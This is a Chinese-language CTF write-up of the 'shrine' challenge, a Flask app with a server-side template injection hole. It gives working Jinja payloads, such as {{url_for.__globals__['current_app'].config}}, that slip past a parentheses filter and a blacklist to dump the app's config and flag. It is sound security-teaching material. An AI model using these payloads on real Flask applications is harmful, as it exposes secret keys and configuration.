---
title: shrine
tags: [Writeups, WEB, SSTI]
categories: CTF
---

Flask框架

<!-- more -->

打开页面就是一段源码

<img src="D:\Hexo\source\_drafts\shrine\first.png" style="zoom:50%;" />

`Ctrl+U`查看源代码可以免除手动格式化的麻烦

```python


import flask
import os

app = flask.Flask(__name__)

app.config['FLAG'] = os.environ.pop('FLAG')


@app.route('/')
def index():
    return open(__file__).read()


@app.route('/shrine/<path:shrine>')
def shrine(shrine):

    def safe_jinja(s):
        s = s.replace('(', '').replace(')', '')
        blacklist = ['config', 'self']
        return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s

    return flask.render_template_string(safe_jinja(shrine))


if __name__ == '__main__':
    app.run(debug=True)

```

经过一段时间的尝试发现`/shrine/FLAG`回显`FLAG`

> 明显是个 `flask` 在 `/shrine/` 下的 `SSTI`
>
> 而且对 payload 进行了过滤
>
> > 对小括号进行了替换，将 ( 和 ) 替换为空字符串 将 config 和 self 添加进了黑名单
>
> **--> Xctf**

> 首先在shrine路径下测试ssti能正常执行
>
> `/shrine/{{ 2+2 }}`
>
> <img src="D:\Hexo\source\_drafts\shrine\ssti.png" style="zoom:50%;" />
>
> 接着分析源码
>
> ```
> app.config['FLAG'] = os.environ.pop('FLAG')
> ```
>
> 注册了一个名为FLAG的config，猜测这就是flag，如果没有过滤可以直接{{config}}即可查看所有app.config内容，但是这题设了黑名单[‘config’,‘self’]并且过滤了括号
>
> ```
> return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s
> ```
>
> 上面这行代码把黑名单的东西遍历并设为空，例如：
>
> ```
> /shrine/{{config}}
> ```
>
> 不过python还有一些内置函数，比如url_for和get_flashed_messages
>
> ```
> /shrine/{{url_for.__globals__}}
> ```
>
> <img src="D:\Hexo\source\_drafts\shrine\url_for.__globals__.png" style="zoom:50%;" />
>
> 看到current_app意思应该是当前app，那我们就当前app下的config：
>
> ```
> /shrine/{{url_for.__globals__['current_app'].config}}
> ```
>
> <img src="D:\Hexo\source\_drafts\shrine\config.png" style="zoom:50%;" />
>
> **get_flashed_messages**
>
> ```
> 返回之前在Flask中通过 flash() 传入的闪现信息列表。把字符串对象表示的消息加入到一个消息队列中，然后通过调用 get_flashed_messages() 方法取出(闪现信息只能取出一次，取出后闪现信息会被清空)。
> ```
>
> 同理
>
> ```
> /shrine/{{get_flashed_messages.__globals__['current_app'].config}}
> ```
>
> **作　　者**：**[王叹之](https://www.cnblogs.com/wangtanzhi)**
> **出　　处**：https://www.cnblogs.com/wangtanzhi/p/12238779.html